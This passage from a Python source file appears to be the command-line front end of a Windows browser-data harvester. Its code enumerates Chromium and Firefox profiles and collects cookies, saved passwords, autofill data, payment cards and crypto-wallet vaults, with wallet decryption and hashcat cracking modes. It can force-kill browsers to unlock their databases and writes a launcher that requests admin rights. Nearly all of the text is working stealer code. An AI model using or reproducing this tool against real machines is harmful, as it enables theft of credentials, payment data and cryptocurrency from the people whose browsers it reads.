        profiles = _firefox_profiles(base)
        if not profiles:
            continue
        browser = {"browser": name, "family": "firefox", "profiles": []}
        for prof in profiles:
            prof_root = os.path.join(base, prof)
            dbs = []
            for rel in ("cookies.sqlite", "places.sqlite",
                        "permissions.sqlite", "formhistory.sqlite"):
                candidate = os.path.join(prof_root, rel)
                if not os.path.isfile(candidate):
                    continue
                result = _audit_sqlite(candidate)
                dbs.append({"database": rel, **result})
                report["checks"] += 1
                if result["integrity"] == "ok":
                    report["ok"] += 1
                elif result["integrity"] == "failed":
                    report["failed"] += 1
                else:
                    report["unavailable"] += 1
            if dbs:
                browser["profiles"].append({"profile": prof, "databases": dbs})
        if browser["profiles"]:
            report["browsers"].append(browser)

    _audit_print(report, quiet=quiet)
    return 1 if report["failed"] else 0


def _cmd_list_browsers() -> None:
    banner(quiet=False)
    print(f"  {C.CYN}◈{C.R}  {C.B}{C.TEXT}detected browsers{C.R}")
    print()
    print(f"     {C.FAINT}{'BROWSER':<16}  {'PROFILES':>8}   "
          f"{'MODE':<6}  {'STATUS':<22}{C.R}")
    print(f"     {C.DIM}{'─' * 60}{C.R}")

    found = 0
    for cfg in BROWSERS:
        det = _detect_chromium(cfg)
        if not det:
            continue
        found += 1
        mode = "abe" if cfg.get("abe") else "v10"
        if cfg.get("abe"):
            svc = cfg["services"][0] if cfg["services"] else ""
            st = _service_state(svc)
            if st == "RUNNING":
                status = f"{C.GRN}ready (abe){C.R}"
            elif st == "STOPPED":
                status = f"{C.YEL}svc stopped (v10){C.R}"
            else:
                status = f"{C.YEL}v10 only{C.R}"
        else:
            status = f"{C.CYN}ready (v10){C.R}"
        print(f"     {_pad(cfg['name'], 16)}  "
              f"{_pad(str(len(det['profiles'])), 8, 'right')}   "
              f"{_pad(mode, 6)}  {status}")

    for name, base in FIREFOX:
        det = _detect_firefox(base)
        if not det:
            continue
        found += 1
        print(f"     {_pad(name, 16)}  "
              f"{_pad(str(len(det['profiles'])), 8, 'right')}   "
              f"{_pad('local', 6)}  {C.CYN}ready{C.R}")

    print()
    if found == 0:
        warn("no supported browsers detected")
    else:
        info(f"{found} browser{'s' if found != 1 else ''} detected")
    print()


def _cmd_list_wallets() -> None:
    banner(quiet=False)
    print(f"  {C.CYN}◈{C.R}  {C.B}{C.TEXT}supported wallets{C.R}")
    print()
    print(f"     {C.FAINT}{'WALLET':<22}  {'SCHEME':<10}  "
          f"{'DECRYPT':<8}  {'HASHCAT':<8}  EXTENSION ID{C.R}")
    print(f"     {C.DIM}{'─' * 84}{C.R}")
    for ext_id, info in _WALLET_REGISTRY.items():
        scheme = info.get("scheme", "generic")
        dec = "yes" if scheme in _WALLET_DECRYPTORS else "no"
        hc = str(info.get("hashcat_mode") or "—")
        print(f"     {_pad(info['name'], 22)}  "
              f"{_pad(scheme, 10)}  "
              f"{_pad(dec, 8)}  {_pad(hc, 8)}  "
              f"{C.FAINT}{ext_id}{C.R}")
    print()
    info(f"{len(_WALLET_REGISTRY)} wallets registered")
    print()


def _now_iso() -> str:
    return datetime.datetime.now(datetime.timezone.utc)\
        .strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _print_drops(drops: Drops, verbose: bool = False) -> None:
    print()
    print(f"  {C.CYN}◈{C.R}  {C.B}{C.TEXT}skipped entries{C.R}")
    print()
    if not drops.counter:
        print(f"     {C.GRN}✓{C.R}  no entries dropped")
        return
    print(f"     {C.FAINT}{'COUNT':>6}  {'CATEGORY':<14}  "
          f"REASON{C.R}")
    print(f"     {C.DIM}{'─' * 50}{C.R}")
    for (cat, reason), n in sorted(drops.counter.items(),
                                    key=lambda x: -x[1]):
        print(f"     {C.YEL}{n:>6}{C.R}  {cat:<14}  "
              f"{C.GRY}{reason}{C.R}")
    print(f"     {C.DIM}{'─' * 50}{C.R}")
    print(f"     {C.YEL}{drops.total():>6}{C.R}  total")
    if verbose:
        for (cat, reason), items in drops.detail.items():
            shown = len(items)
            total_n = drops.counter.get((cat, reason), shown)
            title = f"[{cat} / {reason}]"
            if total_n > shown:
                title += f"  showing {shown}/{total_n}"
            print(f"\n     {C.FAINT}{title}{C.R}")
            for d in items:
                pairs = "  ".join(f"{k}={v}" for k, v in d.items())
                print(f"       {C.FAINT}{pairs}{C.R}")


def _install_launchers() -> int:
    here = os.path.dirname(os.path.abspath(__file__))
    script = os.path.basename(__file__)

    pe_bat = os.path.join(here, "pe.bat")
    admin_bat = os.path.join(here, "pe-admin.bat")

    pe_content = (
        "@echo off\r\n"
        f'py -3 "%~dp0{script}" %*\r\n'
    )
    admin_content = (
        "@echo off\r\n"
        "net session >nul 2>&1\r\n"
        "if %errorlevel% neq 0 (\r\n"
        "    powershell -Command \"Start-Process '%~dp0pe.bat' "
        "-ArgumentList '%*' -Verb RunAs\"\r\n"
        "    exit /b\r\n"
        ")\r\n"
        "\"%~dp0pe.bat\" %*\r\n"
    )

    try:
        with open(pe_bat, "w", newline="") as f:
            f.write(pe_content)
        with open(admin_bat, "w", newline="") as f:
            f.write(admin_content)
    except OSError as exc:
        err(f"could not write launchers: {exc}")
        return 1

    print()
    ok(f"created {pe_bat}")
    ok(f"created {admin_bat}")
    print()
    info("from this directory, run either:")
    print(f"     {C.TEXT}pe --force-kill{C.R}                 "
          f"everything, close browsers first")
    print(f"     {C.TEXT}pe --cookies --passwords{C.R}        "
          f"just those two")
    print(f"     {C.TEXT}pe --format json{C.R}                "
          f"everything, JSON output")
    print(f"     {C.TEXT}pe-admin --force-kill{C.R}           "
          f"same, auto-elevated")
    print()
    return 0


def _scan_wallet_presence(opts: dict) -> List[str]:
    found: List[str] = []
    seen = set()
    try:
        for job in _build_jobs(opts):
            if job.kind != "chromium":
                continue
            cfg = job.data
            det = _detect_chromium(cfg)
            if not det:
                continue
            for prof in det["profiles"]:
                pdir = (cfg["user_data"] if cfg.get("profile_mode") == "single"
                        else os.path.join(cfg["user_data"], prof))
                for ext_id, info in _WALLET_REGISTRY.items():
                    name = info["name"]
                    if name in seen:
                        continue
                    ld = os.path.join(pdir, "Local Extension Settings", ext_id)
                    idb = os.path.join(pdir, "IndexedDB",
                                       "chrome-extension_" + ext_id
                                       + "_0.indexeddb.leveldb")
                    if os.path.isdir(ld) or os.path.isdir(idb):
                        seen.add(name)
                        found.append(name)
    except Exception:
        return found
    return found


def _prompt_wallet_password(found: Optional[List[str]] = None
                             ) -> Optional[str]:
    if not sys.stdin.isatty():
        return None
    try:
        import getpass
        hint = ""
        if found:
            preview = ", ".join(found[:4])
            extra = f" +{len(found) - 4}" if len(found) > 4 else ""
            hint = f"  {C.FAINT}({preview}{extra}){C.R}"
        pw = getpass.getpass(
            f"  wallet password{hint}  (blank to skip): ").strip()
        return pw or None
    except Exception:
        return None


def extract(out_root: str = "out", **opts) -> dict:
    _bootstrap()

    base_opts = {
        "cats": ALL_CATS,
        "quiet": True, "verbose": False, "force_kill": False,
        "jobs": 1, "retries": DEFAULT_RETRIES, "timeout": DEFAULT_TIMEOUT,
        "target": None, "spinner": False, "stream": False,
        "wallet_password": None, "format": "tsv", "important": False,
    }
    base_opts.update(opts)

    started = _now_iso()
    t0 = time.time()

    jobs = _build_jobs(base_opts)

    if base_opts["jobs"] <= 1:
        for job in jobs:
            _run_job(job, out_root, base_opts)
    else:
        with ThreadPoolExecutor(max_workers=base_opts["jobs"]) as ex:
            futures = {ex.submit(_run_job, j, out_root, base_opts): j
                       for j in jobs}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as exc:
                    job = futures[fut]
                    job.error = exc

    results = []
    errors = []
    total_drops = Drops()
    for job in jobs:
        if job.error:
            errors.append({"job": job.kind,
                           "error_type": type(job.error).__name__,
                           "message": "job failed; details omitted"})
            total_drops.merge(job.drops)
            continue
        if job.result:
            results.append(job.result)
            total_drops.merge(job.drops)

    finished = _now_iso()
    duration = time.time() - t0

    totals = {"browsers": len(results),
              "cookies": sum(r.get("cookies", 0) for r in results),
              "passwords": sum(r.get("passwords", 0) for r in results),
              "history": sum(r.get("history", 0) for r in results),
              "autofill": sum(r.get("autofill", 0) for r in results),
              "cards": sum(r.get("cards", 0) for r in results),
              "local_storage": sum(r.get("local_storage", 0) for r in results),
              "bookmarks": sum(r.get("bookmarks", 0) for r in results),
              "extensions": sum(r.get("extensions", 0) for r in results),
              "crypto": sum(r.get("crypto", 0) for r in results),
              "crypto_decrypted": sum(r.get("wallets_decrypted", 0)
                                       for r in results),
              "accounts": sum(r.get("accounts", 0) for r in results),
              "drops": total_drops.total(), "failed_jobs": len(errors)}

    return {
        "tool": __tool__, "version": __version__,
        "author": __author__, "github": __github__,
        "discord": __discord__,
        "started_at": started, "finished_at": finished,
        "duration_s": round(duration, 3),
        "cats": list(base_opts["cats"]),
        "format": base_opts.get("format", "tsv"),
        "important": base_opts.get("important", False),
        "browsers": results, "errors": errors, "totals": totals,
    }


def main(argv: Optional[List[str]] = None) -> int:
    parser = _build_parser()
    args = parser.parse_args(argv)

    if args.no_color or (not sys.stdout.isatty() and sys.platform != "win32"):
        _set_no_color(True)
    else:
        _enable_ansi()

    if args.install_launchers:
        return _install_launchers()

    if args.audit_only:
        return _audit_only(quiet=args.quiet)

    if args.list_browsers:
        _cmd_list_browsers()
        return 0

    if args.list_wallets:
        _cmd_list_wallets()
        return 0

    if sys.platform != "win32":
        err("this tool requires Windows (Win32 / DPAPI / COM)")
        return 1

    _bootstrap()

    banner(quiet=args.quiet)

    if not args.output:
        err("output directory cannot be empty")
        return 1
    out_root = os.path.abspath(args.output)
    os.makedirs(out_root, exist_ok=True)

    cats = _cats_from_args(args)
    if not cats:
        err("no extraction categories selected")
        return 1

    out_fmt = args.format
    if out_fmt == "txt":
        out_fmt = "tsv"

    opts = {
        "cats": cats,
        "quiet": args.quiet,
        "verbose": args.verbose,
        "force_kill": args.force_kill,
        "jobs": max(1, args.jobs),
        "retries": DEFAULT_RETRIES,
        "timeout": DEFAULT_TIMEOUT,
        "target": args.target.lower() if args.target else None,
        "spinner": args.jobs == 1,
        "stream": args.jobs == 1,
        "output": out_root,
        "wallet_password": None,
        "format": out_fmt,
        "important": args.important,
    }

    env_pw = os.environ.get("PE_WALLET_PW")
    explicit_pw = (args.wallet_password
                   if args.wallet_password is not None
                   else env_pw)
    wallet_password = explicit_pw if explicit_pw else None

    prompt_blocked = (
        args.no_wallet_prompt
        or explicit_pw is not None
        or "crypto" not in cats
        or not sys.stdin.isatty()
        or args.quiet
    )
    if not prompt_blocked:
        detected = _scan_wallet_presence(opts)
        if detected:
            wallet_password = _prompt_wallet_password(detected)

    opts["wallet_password"] = wallet_password

    meta = [f"output {C.CYN}{out_root}{C.R}",
            f"cats {C.FAINT}{','.join(cats)}{C.R}",
            f"fmt {C.FAINT}{out_fmt}{C.R}"]
    if args.important:
        meta.append(f"{C.MAG}importants-only{C.R}")
    if "crypto" in cats:
        if wallet_password:
            meta.append(f"{C.GRN}wallet-decrypt{C.R}")
        else:
            meta.append(f"{C.FAINT}wallet-no-pw{C.R}")
    if opts["jobs"] > 1:
        meta.append(f"jobs {opts['jobs']}")
    if args.force_kill:
        meta.append(f"{C.YEL}force-kill{C.R}")
    print(f"     {C.FAINT}{'  ·  '.join(meta)}{C.R}")

    t0 = time.time()
    jobs = _build_jobs(opts)
    if not jobs:
        err("no browsers matched")
        return 2

    if opts["jobs"] <= 1:
        for job in jobs:
            _run_job(job, out_root, opts)
    else:
        with ThreadPoolExecutor(max_workers=opts["jobs"]) as ex:
            futures = {ex.submit(_run_job, j, out_root, opts): j
                       for j in jobs}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as exc:
                    futures[fut].error = exc
        for job in jobs:
            for line in job.output:
                print(line)

    elapsed = time.time() - t0
    results: List[dict] = []
    total_drops = Drops()
    total_failed = 0
    failed_jobs = 0

    for job in jobs:
        if job.error:
            failed_jobs += 1
            err(f"{job.kind}: {type(job.error).__name__} "
                f"(details omitted; use --verbose for traceback)")
            total_drops.merge(job.drops)
            if args.verbose:
                traceback.print_exception(type(job.error), job.error,
                                          job.error.__traceback__)
            continue
        if job.result:
            results.append(job.result)
            total_drops.merge(job.drops)
            total_failed += len(job.result.get("failed", []))

    if not results:
        err("no job completed successfully")
        if args.debug_drops or args.verbose:
            _print_drops(total_drops, args.verbose)
        return 2

    if args.debug_drops or args.verbose:
        _print_drops(total_drops, args.verbose)

    sum_cats = {k: sum(r.get(k, 0) for r in results)
                for k in ("cookies", "passwords", "history", "autofill",
                          "cards", "local_storage", "bookmarks",
                          "extensions", "crypto")}
    wallets_found = sum_cats["crypto"]
    wallets_dec = sum(r.get("wallets_decrypted", 0) for r in results)
    accounts_total = sum(r.get("accounts", 0) for r in results)
    clean = total_failed == 0

    print()
    _box_top()
    _box_row("")
    if clean:
        _box_row(f"  {C.GRN}✓{C.R}  {C.TEXT}done in {elapsed:.1f}s{C.R}")
    else:
        _box_row(f"  {C.YEL}!{C.R}  {C.TEXT}done in {elapsed:.1f}s  "
                 f"{C.FAINT}·  {total_failed} skipped{C.R}")
    _box_row("")
    _box_row(f"  {C.GRY}{'browsers':<14}{C.R}  {C.TEXT}{len(results)}{C.R}")
    for k, label in (("cookies", "cookies"), ("passwords", "passwords"),
                     ("history", "history"), ("autofill", "autofill"),
                     ("cards", "cards/ibans"),
                     ("local_storage", "ls entries"),
                     ("bookmarks", "bookmarks"),
                     ("extensions", "extensions")):
        if k in cats and sum_cats[k]:
            _box_row(f"  {C.GRY}{label:<14}{C.R}  "
                     f"{C.TEXT}{sum_cats[k]}{C.R}")
    if accounts_total:
        _box_row(f"  {C.GRY}{'accounts':<14}{C.R}  "
                 f"{C.TEXT}{accounts_total}{C.R}")
    if "crypto" in cats and wallets_found:
        if wallets_dec == wallets_found:
            wval = f"{C.GRN}{wallets_dec}/{wallets_found}{C.R}"
        elif wallets_dec:
            wval = f"{C.YEL}{wallets_dec}/{wallets_found}{C.R}"
        else:
            wval = f"{C.RED}0/{wallets_found}{C.R}"
        _box_row(f"  {C.GRY}{'wallets':<14}{C.R}  {wval}")
    _box_row(f"  {C.GRY}{'output':<14}{C.R}  {C.TEXT}{out_root}{C.R}")
    _box_row("")
    _box_bot()
    print()

    ran_running = [r["name"] for r in results if r.get("running")]
    if ran_running:
        names = ", ".join(ran_running)
        warn(f"browser was running during extraction: {names}")
        warn(f"  re-run with {C.B}--force-kill{C.R} to close first "
             f"and unlock profile databases")
        print()
    if any(r.get("copy_failed") for r in results):
        warn("one or more profile DBs could not be copied — "
             "browsers are holding them open")
        warn(f"  fix: {C.B}--force-kill{C.R}  or close the browser manually")
        print()
    if any(r.get("wal_busy") for r in results):
        warn("WAL journal busy on some profiles — "
             "recent writes (logins, cookies) may be missing")
        warn("  fix: close the browser fully, then re-run")
        print()

    remaining = wallets_found - wallets_dec
    if remaining > 0:
        plural = "s" if remaining != 1 else ""
        if wallet_password:
            warn(f"{remaining} wallet vault{plural} did not decrypt "
                 f"with the supplied password")
            warn(f"  check {C.B}--debug-drops{C.R} for "
                 f"crypto/decrypt_failed detail")
        else:
            warn(f"{remaining} wallet vault{plural} extracted encrypted "
                 f"(no password given)")
            warn(f"  decrypt with {C.B}--wallet-password PW{C.R}  "
                 f"or  {C.B}set PE_WALLET_PW=...{C.R}")
        print()

    return 1 if (failed_jobs or total_failed
                 or any(r.get("copy_failed") for r in results)) else 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print()
        err("interrupted")
        sys.exit(130)
    except Exception:
        traceback.print_exc()
        sys.exit(1)
